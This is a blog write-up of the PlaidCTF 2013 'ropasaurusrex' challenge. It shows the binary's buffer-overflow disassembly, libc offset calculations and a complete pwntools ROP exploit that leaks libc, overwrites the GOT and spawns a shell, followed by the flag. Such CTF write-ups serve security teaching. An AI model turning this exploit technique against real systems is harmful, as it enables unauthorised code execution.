---
title: ropasaurusrex - PlaidCTF 2013
author: kriztw
layout: post
published: true
date: 2013-05-06 22:52:43
---

Challenge description:

> <pre>ROP ROP ROP ROP ROP ROP ROP
> 54.234.151.114:1025</pre>

> [Download binary](http://dl.ctftime.org/64/364/ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d)

> [Download libc](http://dl.ctftime.org/64/364/libc.so.6-f85c96c8fc753bfa75140c39501b4cd50779f43a)

Looking at the challenge description, this challenge seems to be about feeding ducks or,
more likely, return-oriented-programming. Looking at the files we quickly confirmed that
it was the latter, as we are met with a very short 32bit Linux binary and a version of
libc.

The binary is a bit funky, and it is hard to see which parts are interesting at
first. When you run the program it's easy to see that the program only reads and writes
once, which is probably where the interesting stuff happens:

```objdump
  80483f4:   55                      push   ebp
  80483f5:   89 e5                   mov    ebp,esp
  80483f7:   81 ec 98 00 00 00       sub    esp,0x98
  80483fd:   c7 44 24 08 00 01 00    mov    DWORD PTR [esp+0x8],0x100
  8048404:   00
  8048405:   8d 85 78 ff ff ff       lea    eax,[ebp-0x88]
  804840b:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
  804840f:   c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
  8048416:   e8 11 ff ff ff          call   804832c <read@plt>
  804841b:   c9                      leave
  804841c:   c3                      ret
```

This is a very simple buffer overflow, so the only problem now is to generate ROP to
gain a shell. We only have the symbols `read` and `write` from libc and no other
interesting gadgets to speak of, so our possibilites are limited, but we do have one
possible strategy:

```text
1. Write the address of `write` in libc from the GOT
2. Calculate offset to `system` for their version of libc.
3. Read '/bin/sh' into the .data segment, which has W privileges
4. Read the calculated `system` address into the GOT where `write` is located
5. Call `write` (now `system`) with a pointer to .data as the argument
```

First we need to grab the relevant symbols (`write` and `system`) from their libc (and our
own for local testing):

```console
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@'
  1422: 0003f430   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' write@'
  2265: 000de4c0   128 FUNC    WEAK   DEFAULT   12 write@@GLIBC_2.0
$ echo "Local offset:" $((0x3f430-0xde4c0))
Local offset: -651408
$ readelf -s libc.so.6-f85c96c8fc753bfa75140c39501b4cd50779f43a | grep ' system@'
  1399: 00039450   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
$ readelf -s libc.so.6-f85c96c8fc753bfa75140c39501b4cd50779f43a | grep ' write@'
  2236: 000bf190   122 FUNC    WEAK   DEFAULT   12 write@@GLIBC_2.0
$ echo "Remote offset:" $((0x39450-0xbf190))
Remote offset: -548160
```

We also need to chain the calls properly with pop-ret gadgets. Luckily we have a library
which handles this for us, so the rest of the exploit is straight forward:

```python
#!/usr/bin/env python
from pwn import *
context('i386', 'linux')

splash()

rop = ROP('ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d')

overflow = (0x88 + 4) * 'A'

rop.call('write', [1, rop.got['write'], 4])
rop.call('read', [0, '.data', 8])
rop.call('read', [0, rop.got['write'], 4])
rop.call('write', '.data')
rop_chain =  rop.generate()

sploit = overflow + rop_chain + (0x100 - len(overflow + rop_chain)) * 'A' #+ '/bin/sh' + '\x00' + p32(0xf7e4e430)

# Remote
#system_write_offset = -548160
#proc = remote('54.234.151.114', 1025)

# Local
system_write_offset = -651408
proc = process('./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d')

proc.send(sploit)

# Calculate system addr in libc
write_addr = [x[2:] for x in map(hex, map(ord, proc.recv()))]
write_addr.reverse()
system = int(flat(write_addr),16) + system_write_offset

proc.send('/bin/sh\x00')
proc.send(p32(system))
proc.interactive()
```

Key: you_cant_stop_the_ropasaurusrex
